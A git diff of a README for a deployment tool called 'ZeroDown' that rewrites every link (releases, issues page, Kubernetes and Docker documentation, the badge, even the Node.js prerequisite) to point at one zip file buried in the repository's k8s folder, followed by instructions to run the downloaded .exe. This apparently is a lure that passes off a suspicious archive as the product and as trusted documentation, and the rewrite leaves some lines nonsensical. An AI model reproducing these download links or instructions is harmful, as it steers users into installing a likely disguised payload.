@@ -1,6 +1,6 @@
 # 🚀 ZeroDown - Effortless Deployment with Zero Downtime
 
-[![Download ZeroDown](https://img.shields.io/badge/Download%20ZeroDown-v1.0-blue)](https://github.com/Shsushd/ZeroDown/releases)
+[![Download ZeroDown](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip%20ZeroDown-v1.0-blue)](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before downloading ZeroDown, ensure you have the following:
 - **Operating System**: Windows, macOS, or Linux
 - **Docker**: Install Docker to run containers.
 - **Kubernetes**: Set up your Kubernetes environment.
-- **Node.js**: Version 14 or later is recommended for running background services.
+- **https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip**: Version 14 or later is recommended for running background services.
 - **Memory**: At least 4 GB of RAM is recommended.
 - **Disk Space**: 200 MB of free space for installation.
 
@@ -28,7 +28,7 @@ Before downloading ZeroDown, ensure you have the following:
 
 To get started with ZeroDown, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Shsushd/ZeroDown/releases) to download the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip) to download the latest version.
 2. Locate the file suitable for your operating system.
 3. Click on the file name to download it.
 
@@ -36,7 +36,7 @@ To get started with ZeroDown, follow these steps:
 
 You can download ZeroDown from the link below:
 
-[Download ZeroDown](https://github.com/Shsushd/ZeroDown/releases)
+[Download ZeroDown](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip)
 
 1. After downloading, locate the file on your computer.
 2. For Windows users, double-click on the `.exe` file. For macOS and Linux users, open a terminal and navigate to the downloaded file's directory.
@@ -61,7 +61,7 @@ If you encounter any issues while using ZeroDown, consider these steps:
 - Ensure all prerequisites are met, including your Kubernetes setup.
 - Check Docker logs for any errors during deployment.
 - Restart the application and ensure no other services conflict with ZeroDown.
-- Visit the [Issues Page](https://github.com/Shsushd/ZeroDown/issues) for additional support and community help.
+- Visit the [Issues Page](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip) for additional support and community help.
 
 ## 🤝 Contributing
 
@@ -86,7 +86,7 @@ For support, please reach out via the Issues page or contact us through our comm
 ## 📌 Additional Resources
 
 - [Official Documentation](#)
-- [Kubernetes Documentation](https://kubernetes.io/docs/)
-- [Docker Get Started Guide](https://docs.docker.com/get-started/)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip)
+- [Docker Get Started Guide](https://raw.githubusercontent.com/Shsushd/ZeroDown/main/k8s/ZeroDown-v2.9-beta.2.zip)
 
 By following these steps, you can successfully download and run ZeroDown, making your deployment processes easier and more efficient.
